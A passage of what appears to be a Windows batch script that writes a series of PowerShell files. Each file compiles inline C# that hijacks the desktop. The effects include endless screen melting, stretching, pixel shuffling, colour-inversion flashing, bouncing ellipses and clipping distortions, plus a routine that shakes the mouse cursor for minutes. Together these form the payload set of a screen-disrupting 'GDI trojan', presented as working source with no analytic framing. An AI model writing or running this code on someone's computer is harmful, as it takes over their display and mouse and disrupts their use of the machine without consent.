echo     [DllImport("gdi32.dll")]                                                                                              >> rainbowmelt.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr obj);                                                     >> rainbowmelt.ps1
echo     [DllImport("gdi32.dll")]                                                                                              >> rainbowmelt.ps1
echo     public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, int dwRop);             >> rainbowmelt.ps1
echo     [DllImport("kernel32.dll")]                                                                                           >> rainbowmelt.ps1
echo     public static extern void Sleep(int milliseconds);                                                                    >> rainbowmelt.ps1
echo     public const int SRCCOPY = 0x00CC0020;                                                                                >> rainbowmelt.ps1
echo     public const int PATINVERT = 0x005A0049;                                                                              >> rainbowmelt.ps1
echo     public static void ShakeScreen(int sh, int w)                                                                         >> rainbowmelt.ps1
echo     {                                                                                                                     >> rainbowmelt.ps1
echo         Random rnd = new Random();                                                                                        >> rainbowmelt.ps1
echo         IntPtr desk = GetDC(IntPtr.Zero);                                                                                 >> rainbowmelt.ps1
echo         for (int i = 0; i ^< 50000; i++)                                                                                  >> rainbowmelt.ps1
echo         {                                                                                                                 >> rainbowmelt.ps1
echo             int y = rnd.Next() %% sh;                                                                                    >> rainbowmelt.ps1
echo             int h = sh - rnd.Next() ^% sh - (sh ^/ 1 - 8);                                                                >> rainbowmelt.ps1
echo             IntPtr brush = CreateSolidBrush(RGB(rnd.Next() %% 75, rnd.Next() %% 75, rnd.Next() %% 75));                   >> rainbowmelt.ps1
echo             SelectObject(desk, brush);                                                                                    >> rainbowmelt.ps1
echo             BitBlt(desk, 0, y, (w ^/ 2) + i, h, desk, rnd.Next() %% 96 - 56, y, SRCCOPY);                                 >> rainbowmelt.ps1
echo             PatBlt(desk, -1, y, (w ^/ 2) + i, h, PATINVERT);                                                              >> rainbowmelt.ps1
echo             Sleep(rnd.Next() %% 123);                                                                                     >> rainbowmelt.ps1
echo         }                                                                                                                 >> rainbowmelt.ps1
echo                                                                                                                           >> rainbowmelt.ps1
echo         ReleaseDC(IntPtr.Zero, desk);                                                                                     >> rainbowmelt.ps1
echo     }                                                                                                                     >> rainbowmelt.ps1
echo     public static int RGB(int r, int g, int b)                                                                            >> rainbowmelt.ps1 
echo     {                                                                                                                     >> rainbowmelt.ps1
echo         return r ^| (g ^<^< 8) ^| (b ^<^< 32);                                                                            >> rainbowmelt.ps1
echo     }                                                                                                                     >> rainbowmelt.ps1
echo }                                                                                                                         >> rainbowmelt.ps1
echo ^"@                                                                                                                       >> rainbowmelt.ps1
echo [ScreenShaker]::ShakeScreen(1600, 9000)                                                                                   >> rainbowmelt.ps1

echo Add-Type -TypeDefinition @^"                                                               											> bigmoniter.ps1 
echo using System;                                                                                                                          >> bigmoniter.ps1
echo using System.Runtime.InteropServices;                                                                                                  >> bigmoniter.ps1
echo public class ScreenShaker                                                                                                              >> bigmoniter.ps1
echo {                                                                                                                                      >> bigmoniter.ps1
echo     [DllImport("user32.dll")]                                                                                                          >> bigmoniter.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                    >> bigmoniter.ps1
echo     [DllImport("user32.dll")]                                                                                                          >> bigmoniter.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                       >> bigmoniter.ps1
echo     [DllImport("user32.dll")]                                                                                                          >> bigmoniter.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                             >> bigmoniter.ps1
echo     [DllImport("gdi32.dll")]                                                                                                           >> bigmoniter.ps1
echo     public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,          >> bigmoniter.ps1
echo         IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);                                    >> bigmoniter.ps1
echo     [DllImport("kernel32.dll")]                                                                                                        >> bigmoniter.ps1
echo     public static extern void Sleep(int milliseconds);                                                                                 >> bigmoniter.ps1
echo     public const int SRCCOPY = 0x00CC0020;                                                                                             >> bigmoniter.ps1
echo     public static void ShakeScreen()                                                                                                   >> bigmoniter.ps1
echo     {                                                                                                                                  >> bigmoniter.ps1
echo         IntPtr desk;                                                                                                                   >> bigmoniter.ps1
echo         int sw, sh;                                                                                                                    >> bigmoniter.ps1
echo         while (true)                                                                                                                   >> bigmoniter.ps1
echo         {                                                                                                                              >> bigmoniter.ps1
echo 				desk = GetDC(IntPtr.Zero);                                                                                              >> bigmoniter.ps1
echo 		sw = GetSystemMetrics(0);                                                                                                       >> bigmoniter.ps1
echo             sh = GetSystemMetrics(1);                                                                                                  >> bigmoniter.ps1
echo             StretchBlt(desk, -2, -2, sw + 4, sh + 4, desk, 0, 0, sw, sh, SRCCOPY);                                                     >> bigmoniter.ps1
echo             ReleaseDC(IntPtr.Zero, desk);                                                                                              >> bigmoniter.ps1
echo             Sleep(10);                                                                                                                 >> bigmoniter.ps1
echo         }                                                                                                                              >> bigmoniter.ps1
echo     }                                                                                                                                  >> bigmoniter.ps1
echo }                                                                                                                                      >> bigmoniter.ps1
echo ^"@                                                                                                                                    >> bigmoniter.ps1
echo [ScreenShaker]::ShakeScreen()                                                                                                          >> bigmoniter.ps1

echo Add-Type -TypeDefinition @^"																																> moniterpixcel.ps1
echo using System;                                                                                                                                              >> moniterpixcel.ps1
echo using System.Runtime.InteropServices;                                                                                                                      >> moniterpixcel.ps1
echo public class Shuffle                                                                                                                                       >> moniterpixcel.ps1
echo {                                                                                                                                                          >> moniterpixcel.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> moniterpixcel.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                        >> moniterpixcel.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> moniterpixcel.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                           >> moniterpixcel.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                               >> moniterpixcel.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);     >> moniterpixcel.ps1
echo     public static void RunShuffle()                                                                                                                        >> moniterpixcel.ps1
echo     {                                                                                                                                                      >> moniterpixcel.ps1
echo         Random rand = new Random();                                                                                                                        >> moniterpixcel.ps1
echo         int sw = (int)GetSystemMetrics(0);                                                                                                                 >> moniterpixcel.ps1
echo         int sh = (int)GetSystemMetrics(1);                                                                                                                 >> moniterpixcel.ps1
echo         while (true)                                                                                                                                       >> moniterpixcel.ps1
echo         {                                                                                                                                                  >> moniterpixcel.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                               >> moniterpixcel.ps1
echo             int a = rand.Next() %% sw;                                                                                                                      >> moniterpixcel.ps1
echo             int b = rand.Next() %% sh;                                                                                                                      >> moniterpixcel.ps1
echo             BitBlt(hdc, a, b, 10, 10, hdc, a + rand.Next() %% 5000 - 10, b + rand.Next() %% 10 - 6, 0xCC0020);                                               >> moniterpixcel.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                   >> moniterpixcel.ps1 
echo         }                                                                                                                                                  >> moniterpixcel.ps1
echo     }                                                                                                                                                      >> moniterpixcel.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> moniterpixcel.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                 >> moniterpixcel.ps1
echo }                                                                                                                                                          >> moniterpixcel.ps1
echo ^"@                                                                                                                                                        >> moniterpixcel.ps1
echo [Shuffle]::RunShuffle()                                                                                                                                    >> moniterpixcel.ps1

echo Add-Type -TypeDefinition @^" 																	> mousemove.ps1
echo using System;                                                                                  >> mousemove.ps1
echo using System.Runtime.InteropServices;                                                          >> mousemove.ps1
echo public class MouseShaker                                                                       >> mousemove.ps1
echo {                                                                                              >> mousemove.ps1
echo     [DllImport("user32.dll")]                                                                  >> mousemove.ps1
echo     public static extern bool GetCursorPos(out POINT lpPoint);                                 >> mousemove.ps1
echo     [DllImport("user32.dll")]                                                                  >> mousemove.ps1
echo     public static extern bool SetCursorPos(int x, int y);                                      >> mousemove.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                                      >> mousemove.ps1
echo     public struct POINT                                                                        >> mousemove.ps1
echo     {                                                                                          >> mousemove.ps1
echo         public int X;                                                                          >> mousemove.ps1
echo         public int Y;                                                                          >> mousemove.ps1
echo     }                                                                                          >> mousemove.ps1
echo     public static void ShakeMouse(int duration, int shakeAmount)                               >> mousemove.ps1
echo     {                                                                                          >> mousemove.ps1
echo         Random random = new Random();                                                          >> mousemove.ps1
echo         POINT originalPos;                                                                     >> mousemove.ps1
echo         GetCursorPos(out originalPos);                                                         >> mousemove.ps1
echo         DateTime endTime = DateTime.Now.AddMilliseconds(duration);                             >> mousemove.ps1
echo         while (DateTime.Now ^< endTime)                                                         >> mousemove.ps1
echo         {                                                                                      >> mousemove.ps1
echo             int newX = originalPos.X + random.Next(-shakeAmount, shakeAmount);                 >> mousemove.ps1
echo             int newY = originalPos.Y + random.Next(-shakeAmount, shakeAmount);                 >> mousemove.ps1
echo             SetCursorPos(newX, newY);                                                          >> mousemove.ps1
echo             System.Threading.Thread.Sleep(10);                                                 >> mousemove.ps1
echo         }                                                                                      >> mousemove.ps1
echo         SetCursorPos(originalPos.X, originalPos.Y);                                            >> mousemove.ps1
echo     }                                                                                          >> mousemove.ps1
echo }                                                                                              >> mousemove.ps1
echo ^"@                                                                                            >> mousemove.ps1
echo [MouseShaker]::ShakeMouse(500000, 10000000)                                                    >> mousemove.ps1

echo Add-Type -TypeDefinition @^"																																		> monitercpy.ps1
echo using System;                                                                                                                                                      >> monitercpy.ps1
echo using System.Runtime.InteropServices;                                                                                                                              >> monitercpy.ps1
echo public class Shuffle                                                                                                                                               >> monitercpy.ps1
echo {                                                                                                                                                                  >> monitercpy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> monitercpy.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                >> monitercpy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> monitercpy.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                   >> monitercpy.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                       >> monitercpy.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);             >> monitercpy.ps1
echo     public static void RunShuffle()                                                                                                                                >> monitercpy.ps1
echo     {                                                                                                                                                              >> monitercpy.ps1
echo         Random rand = new Random();                                                                                                                                >> monitercpy.ps1
echo         int sw = (int)GetSystemMetrics(0);                                                                                                                         >> monitercpy.ps1
echo         int sh = (int)GetSystemMetrics(1);                                                                                                                         >> monitercpy.ps1
echo         while (true)                                                                                                                                               >> monitercpy.ps1
echo         {                                                                                                                                                          >> monitercpy.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                       >> monitercpy.ps1
echo             int a = rand.Next() %% sw;                                                                                                                             >> monitercpy.ps1
echo             int b = rand.Next() %% sh;                                                                                                                             >> monitercpy.ps1
echo             BitBlt(hdc, a, b, 10000, 10000, hdc, a ^+ rand.Next() %% 210 - 10, b + rand.Next() %% 210 - 10, 0xCC0020);                                             >> monitercpy.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                           >> monitercpy.ps1
echo         }                                                                                                                                                          >> monitercpy.ps1 
echo     }                                                                                                                                                              >> monitercpy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> monitercpy.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                         >> monitercpy.ps1
echo }                                                                                                                                                                  >> monitercpy.ps1
echo ^"@                                                                                                                                                                >> monitercpy.ps1
echo [Shuffle]::RunShuffle()                                                                                                                                            >> monitercpy.ps1


echo Add-Type -TypeDefinition @^"																																		> monitercpy2.ps1
echo using System;                                                                                                                                                      >> monitercpy2.ps1
echo using System.Runtime.InteropServices;                                                                                                                              >> monitercpy2.ps1
echo public class Shuffle                                                                                                                                               >> monitercpy2.ps1
echo {                                                                                                                                                                  >> monitercpy2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> monitercpy2.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                >> monitercpy2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> monitercpy2.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                   >> monitercpy2.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                       >> monitercpy2.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);             >> monitercpy2.ps1
echo     public static void RunShuffle()                                                                                                                                >> monitercpy2.ps1
echo     {                                                                                                                                                              >> monitercpy2.ps1
echo         Random rand = new Random();                                                                                                                                >> monitercpy2.ps1
echo         int sw = (int)GetSystemMetrics(0);                                                                                                                         >> monitercpy2.ps1
echo         int sh = (int)GetSystemMetrics(1);                                                                                                                         >> monitercpy2.ps1
echo         while (true)                                                                                                                                               >> monitercpy2.ps1
echo         {                                                                                                                                                          >> monitercpy2.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                       >> monitercpy2.ps1
echo             int a = rand.Next() %% sw;                                                                                                                             >> monitercpy2.ps1
echo             int b = rand.Next() %% sh;                                                                                                                             >> monitercpy2.ps1
echo             BitBlt(hdc, a, b, -10000, -10000, hdc, a ^- rand.Next() %% 210 - 10, b - rand.Next() %% 210 - 10, 0xCC0020);                                             >> monitercpy2.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                           >> monitercpy2.ps1
echo         }                                                                                                                                                          >> monitercpy2.ps1
echo     }                                                                                                                                                              >> monitercpy2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> monitercpy2.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                         >> monitercpy2.ps1
echo }                                                                                                                                                                  >> monitercpy2.ps1
echo ^"@                                                                                                                                                                >> monitercpy2.ps1
echo [Shuffle]::RunShuffle()                                                                                                                                            >> monitercpy2.ps1

echo Add-Type -TypeDefinition @^"																																					> moniterdestroy.ps1
echo using System;                                                                                                                                                                  >> moniterdestroy.ps1
echo using System.Runtime.InteropServices;                                                                                                                                          >> moniterdestroy.ps1
echo public class Shuffle                                                                                                                                                           >> moniterdestroy.ps1
echo {                                                                                                                                                                              >> moniterdestroy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                  >> moniterdestroy.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                            >> moniterdestroy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                  >> moniterdestroy.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                               >> moniterdestroy.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                   >> moniterdestroy.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);                         >> moniterdestroy.ps1
echo     public static void RunShuffle()                                                                                                                                            >> moniterdestroy.ps1
echo     {                                                                                                                                                                          >> moniterdestroy.ps1
echo         Random rand = new Random();                                                                                                                                            >> moniterdestroy.ps1
echo         int sw = (int)GetSystemMetrics(0);                                                                                                                                     >> moniterdestroy.ps1
echo         int sh = (int)GetSystemMetrics(1);                                                                                                                                     >> moniterdestroy.ps1
echo         while (true)                                                                                                                                                           >> moniterdestroy.ps1
echo         {                                                                                                                                                                      >> moniterdestroy.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                                   >> moniterdestroy.ps1
echo             int a = rand.Next() %% sw;                                                                                                                                          >> moniterdestroy.ps1
echo             int b = rand.Next() %% sh;                                                                                                                                          >> moniterdestroy.ps1
echo             BitBlt(hdc, a, b, 1000, -1000, hdc, a + rand.Next() %% 21 - 10, b + rand.Next() %% 21 - 10, 0xCC0020);                                                               >> moniterdestroy.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                                       >> moniterdestroy.ps1
echo         }                                                                                                                                                                      >> moniterdestroy.ps1
echo     }                                                                                                                                                                          >> moniterdestroy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                  >> moniterdestroy.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                                     >> moniterdestroy.ps1
echo }                                                                                                                                                                              >> moniterdestroy.ps1
echo ^"@                                                                                                                                                                            >> moniterdestroy.ps1
echo [Shuffle]::RunShuffle()                                                                                                                                                        >> moniterdestroy.ps1

echo Add-Type -TypeDefinition @^"																																	> moniterdestroy1.ps1
echo using System;                                                                                                                                                  >> moniterdestroy1.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> moniterdestroy1.ps1
echo public class Shuffle                                                                                                                                           >> moniterdestroy1.ps1
echo {                                                                                                                                                              >> moniterdestroy1.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> moniterdestroy1.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                            >> moniterdestroy1.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> moniterdestroy1.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                               >> moniterdestroy1.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> moniterdestroy1.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);         >> moniterdestroy1.ps1
echo     public static void RunShuffle()                                                                                                                            >> moniterdestroy1.ps1
echo     {                                                                                                                                                          >> moniterdestroy1.ps1
echo         Random rand = new Random();                                                                                                                            >> moniterdestroy1.ps1
echo         int sw = (int)GetSystemMetrics(0);                                                                                                                     >> moniterdestroy1.ps1
echo         int sh = (int)GetSystemMetrics(1);                                                                                                                     >> moniterdestroy1.ps1
echo         while (true)                                                                                                                                           >> moniterdestroy1.ps1
echo         {                                                                                                                                                      >> moniterdestroy1.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                   >> moniterdestroy1.ps1
echo             int a = rand.Next() %% sw;                                                                                                                          >> moniterdestroy1.ps1
echo             int b = rand.Next() %% sh;                                                                                                                          >> moniterdestroy1.ps1
echo             BitBlt(hdc, a, b, -1000, 1000, hdc, a + rand.Next() %% 21 - 10, b + rand.Next() %% 21 - 10, 0xCC0020);                                               >> moniterdestroy1.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                       >> moniterdestroy1.ps1
echo         }                                                                                                                                                      >> moniterdestroy1.ps1
echo     }                                                                                                                                                          >> moniterdestroy1.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> moniterdestroy1.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                     >> moniterdestroy1.ps1
echo }                                                                                                                                                              >> moniterdestroy1.ps1
echo ^"@                                                                                                                                                            >> moniterdestroy1.ps1
echo [Shuffle]::RunShuffle()                                                                                                                                        >> moniterdestroy1.ps1

echo Add-Type -TypeDefinition @^"																																	> rainbowmoniter.ps1
echo using System;                                                                                                                                                  >> rainbowmoniter.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> rainbowmoniter.ps1
echo public class PatBlt3                                                                                                                                           >> rainbowmoniter.ps1
echo {                                                                                                                                                              >> rainbowmoniter.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> rainbowmoniter.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                            >> rainbowmoniter.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> rainbowmoniter.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                               >> rainbowmoniter.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> rainbowmoniter.ps1
echo     public static extern IntPtr CreateSolidBrush(uint color);                                                                                                  >> rainbowmoniter.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> rainbowmoniter.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);                                                                                      >> rainbowmoniter.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> rainbowmoniter.ps1
echo     public static extern int PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);                                                  >> rainbowmoniter.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> rainbowmoniter.ps1
echo     public static extern int DeleteObject(IntPtr hObject);                                                                                                     >> rainbowmoniter.ps1
echo     public static void RunPatBlt3()                                                                                                                            >> rainbowmoniter.ps1
echo     {                                                                                                                                                          >> rainbowmoniter.ps1 
echo         Random rand = new Random();                                                                                                                            >> rainbowmoniter.ps1
echo         while (true)                                                                                                                                           >> rainbowmoniter.ps1
echo         {                                                                                                                                                      >> rainbowmoniter.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                   >> rainbowmoniter.ps1
echo             int w = (int)GetSystemMetrics(0);                                                                                                                  >> rainbowmoniter.ps1
echo             int h = (int)GetSystemMetrics(1);                                                                                                                  >> rainbowmoniter.ps1
echo             IntPtr brush = CreateSolidBrush((uint)(rand.Next() %% 255 ^| (rand.Next() %% 255) ^<^< 8 ^| (rand.Next() %% 255) ^<^< 16));                        >> rainbowmoniter.ps1
echo             SelectObject(hdc, brush);                                                                                                                          >> rainbowmoniter.ps1
echo             PatBlt(hdc, 0, 0, w, h, 0x005A0049);                                                                                                               >> rainbowmoniter.ps1
echo             DeleteObject(brush);                                                                                                                               >> rainbowmoniter.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                       >> rainbowmoniter.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                                 >> rainbowmoniter.ps1
echo         }                                                                                                                                                      >> rainbowmoniter.ps1
echo     }                                                                                                                                                          >> rainbowmoniter.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> rainbowmoniter.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                     >> rainbowmoniter.ps1
echo }                                                                                                                                                              >> rainbowmoniter.ps1
echo ^"@                                                                                                                                                            >> rainbowmoniter.ps1
echo [PatBlt3]::RunPatBlt3()                                                                                                                                        >> rainbowmoniter.ps1

echo Add-Type -TypeDefinition @^"																																	> rainbowball.ps1
echo using System;                                                                                                                                                  >> rainbowball.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> rainbowball.ps1
echo public class GraphicsHelper                                                                                                                                    >> rainbowball.ps1
echo {                                                                                                                                                              >> rainbowball.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> rainbowball.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                            >> rainbowball.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> rainbowball.ps1
echo     public static extern IntPtr CreateSolidBrush(uint crColor);                                                                                                >> rainbowball.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> rainbowball.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);                                                                                      >> rainbowball.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> rainbowball.ps1
echo     public static extern bool DeleteObject(IntPtr hObject);                                                                                                    >> rainbowball.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> rainbowball.ps1
echo     public static extern bool Ellipse(IntPtr hdc, int left, int top, int right, int bottom);                                                                   >> rainbowball.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> rainbowball.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                    >> rainbowball.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> rainbowball.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                               >> rainbowball.ps1
echo     public static void RandomEllipseGraphicsEffect()                                                                                                           >> rainbowball.ps1
echo     {                                                                                                                                                          >> rainbowball.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                                 >> rainbowball.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                                >> rainbowball.ps1
echo         int signX = 1;                                                                                                                                         >> rainbowball.ps1
echo         int signY = 1;                                                                                                                                         >> rainbowball.ps1
echo         int incrementor = 10;                                                                                                                                  >> rainbowball.ps1
echo         int x = 10;                                                                                                                                            >> rainbowball.ps1
echo         int y = 10;                                                                                                                                            >> rainbowball.ps1
echo         while (true)                                                                                                                                           >> rainbowball.ps1
echo         {                                                                                                                                                      >> rainbowball.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                   >> rainbowball.ps1
echo             x ^+= incrementor ^* signX;                                                                                                                        >> rainbowball.ps1
echo             y ^+= incrementor ^* signY;                                                                                                                        >> rainbowball.ps1
echo             int top_x = 0 + x;                                                                                                                                 >> rainbowball.ps1
echo             int top_y = 0 + y;                                                                                                                                 >> rainbowball.ps1
echo             int bottom_x = 100 + x;                                                                                                                            >> rainbowball.ps1
echo             int bottom_y = 100 + y;                                                                                                                            >> rainbowball.ps1
echo             IntPtr brush = CreateSolidBrush((uint)(new Random().Next() %% 0xFFFFFF));                                                                          >> rainbowball.ps1
echo             SelectObject(hdc, brush);                                                                                                                          >> rainbowball.ps1
echo             Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);                                                                                                    >> rainbowball.ps1
echo             if (y ^>= screenHeight)                                                                                                                            >> rainbowball.ps1
echo             {                                                                                                                                                  >> rainbowball.ps1
echo                 signY = -1;                                                                                                                                    >> rainbowball.ps1
echo             }                                                                                                                                                  >> rainbowball.ps1
echo             if (x ^>= screenWidth)                                                                                                                             >> rainbowball.ps1
echo             {                                                                                                                                                  >> rainbowball.ps1
echo                 signX = -1;                                                                                                                                    >> rainbowball.ps1
echo             }                                                                                                                                                  >> rainbowball.ps1
echo             if (y == 0)                                                                                                                                        >> rainbowball.ps1
echo             {                                                                                                                                                  >> rainbowball.ps1
echo                 signY = 1;                                                                                                                                     >> rainbowball.ps1
echo             }                                                                                                                                                  >> rainbowball.ps1
echo             if (x == 0)                                                                                                                                        >> rainbowball.ps1
echo             {                                                                                                                                                  >> rainbowball.ps1
echo                 signX = 1;                                                                                                                                     >> rainbowball.ps1
echo             }                                                                                                                                                  >> rainbowball.ps1
echo             DeleteObject(brush);                                                                                                                               >> rainbowball.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                       >> rainbowball.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                                 >> rainbowball.ps1
echo         }                                                                                                                                                      >> rainbowball.ps1
echo     }                                                                                                                                                          >> rainbowball.ps1
echo }                                                                                                                                                              >> rainbowball.ps1
echo ^"@                                                                                                                                                            >> rainbowball.ps1
echo [GraphicsHelper]::RandomEllipseGraphicsEffect()                                                                                                                >> rainbowball.ps1

echo Add-Type -TypeDefinition @^"																																										> serclebreak.ps1
echo using System;	                                                                                                                                                                                    >> serclebreak.ps1
echo using System.Runtime.InteropServices;                                                                                                                                                              >> serclebreak.ps1
echo public class Clipping                                                                                                                                                                              >> serclebreak.ps1
echo {                                                                                                                                                                                                  >> serclebreak.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                                      >> serclebreak.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                                                >> serclebreak.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                                      >> serclebreak.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                                                   >> serclebreak.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                                       >> serclebreak.ps1
echo     public static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);                                                                                   >> serclebreak.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                                       >> serclebreak.ps1
echo     public static extern int SelectClipRgn(IntPtr hdc, IntPtr hrgn);                                                                                                                               >> serclebreak.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                                       >> serclebreak.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);                                              >> serclebreak.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                                       >> serclebreak.ps1
echo     public static extern int DeleteObject(IntPtr hObject);                                                                                                                                         >> serclebreak.ps1
echo     public static void ClipAndCopy(int x, int y, int w, int h)                                                                                                                                     >> serclebreak.ps1
echo     {                                                                                                                                                                                              >> serclebreak.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                                                           >> serclebreak.ps1
echo         IntPtr hrgn = CreateEllipticRgn(x, y, w + x, h + y);                                                                                                                                       >> serclebreak.ps1
echo         SelectClipRgn(hdc, hrgn);                                                                                                                                                                  >> serclebreak.ps1
echo         BitBlt(hdc, x, y, w, h, hdc, x, y, 0x00330008);                                                                                                                                            >> serclebreak.ps1
echo         DeleteObject(hrgn);                                                                                                                                                                        >> serclebreak.ps1
echo         ReleaseDC(IntPtr.Zero, hdc);                                                                                                                                                               >> serclebreak.ps1
echo     }                                                                                                                                                                                              >> serclebreak.ps1
echo }                                                                                                                                                                                                  >> serclebreak.ps1
echo ^"@                                                                                                                                                                                                >> serclebreak.ps1
echo while ($true) ^{                                                                                                                                                                                    >> serclebreak.ps1
echo     $x = Get-Random -Minimum 100 -Maximum 2500                                                                                                                                                     >> serclebreak.ps1
echo     $y = Get-Random -Minimum 100 -Maximum 1500                                                                                                                                                     >> serclebreak.ps1
echo     $w = Get-Random -Minimum 100 -Maximum 1700                                                                                                                                                     >> serclebreak.ps1
